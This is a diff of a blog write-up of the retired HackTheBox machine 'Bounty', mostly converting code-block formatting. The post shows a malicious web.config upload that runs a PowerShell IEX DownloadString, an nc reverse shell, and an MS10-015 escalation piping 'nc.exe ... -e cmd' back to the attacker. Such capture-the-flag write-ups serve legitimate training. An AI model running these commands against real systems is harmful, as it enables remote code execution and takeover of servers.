@@ -12,17 +12,20 @@ This is a great box from the HTB 'retired' list.
 Diving straight in with nmap then...
 `nmap -sV -Pn -v 10.10.10.93 |tee -a boun.txt`
 
-{% highlight ruby %}
+```
+
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 7.5
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-{% endhighlight %}
+
+```
 
 Not a great deal of choice...
 
 Lets have a closer look.
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired/bounty# nmap --script=vuln -p80 10.10.10.93
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-26 07:45 EST
 Nmap scan report for bounty.htb (10.10.10.93)
@@ -49,14 +52,15 @@ PORT   STATE SERVICE
 |_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
 
 Nmap done: 1 IP address (1 host up) scanned in 273.70 seconds
-{% endhighlight %}
 
+```
 
 Forced-browsing with gobuster...
 
 `gobuster -u http://10.10.10.93 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x .aspx,.asp,.html`
 
-{% highlight ruby %}
+```
+
 =====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
@@ -77,7 +81,8 @@ Progress: 15215 / 882244 (1.72%)/transfer.aspx (Status: 200)
 =====================================================
 2019/11/13 10:13:53 Finished
 =====================================================
-{% endhighlight %}
+
+```
 
 /transfer.aspx is worth looking at closer....
 
@@ -85,7 +90,8 @@ we find that we can only upload web.config files...
 
 we have to create an xml file and call it web.config
 
-{% highlight ruby %}
+```
+
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
        <system.webServer>
@@ -110,8 +116,8 @@ Set cmd = rs.Exec("cmd /c powershell -c iex(New-Object Net.WebClient).DownloadSt
 o = cmd.StdOut.Readall()
 Responsse.write(o)
 %>
-{% endhighlight %}
 
+```
 
 If you haven't already, get to know xml files, they can be super useful; and also (perhaps more importantly) get to know useful powershell commands.
 the IEX DownloadString one above is very useful, as is the IWR (Invoke-WebRequest) one. You will find them invaluable when working with Windows targets.
@@ -132,10 +138,12 @@ Also get an nc shell running to catch the resulting reverse-shell connection...
 
 we get PowerShell command-line as user merlin....and access to the user flag.
 
-{% highlight ruby %}
+```
+
 PS C:\users\merlin\desktop> more user.txt
 #  e29xxxxxxxxxxxxxxxxxxxf
-{% endhighlight %}
+
+```
 
 The laziest way to continue would be to use windows-exploit-suggester.py
 
@@ -147,7 +155,8 @@ get nc.exe onto target..
 
 copy systeminfo to kali file sysinfo.txt
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired/bounty# python wes.py --update
 [*] initiating winsploit version 3.3...
 [+] writing to file 2020-01-26-mssb.xls
@@ -177,7 +186,8 @@ root@kali:~/HTB/retired/bounty# python wes.py --database 2020-01-26-mssb.xls --s
 [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
 [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
 [*] done
-{% endhighlight %}
+
+```
 
 select ms10-015 to try escalation...not listed here...but does work...I've used it recently and I've got it readily to hand.
 
@@ -186,11 +196,13 @@ select ms10-015 to try escalation...not listed here...but does work...I've used 
 
 `c:\boo\priv.exe "c:\boo\nc.exe 10.10.14.19 999 -e cmd"`
 
-{% highlight ruby %}
+```
+
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 c8xxxxxxxxxxxxxxxxxxxxea
-{% endhighlight %}
+
+```
 
 It worked !!! If it had failed, I could have gone down the suggested list trying each, If the machine was patched against those vulnerabilities it would have required closer manual or scripted inspection. 
 
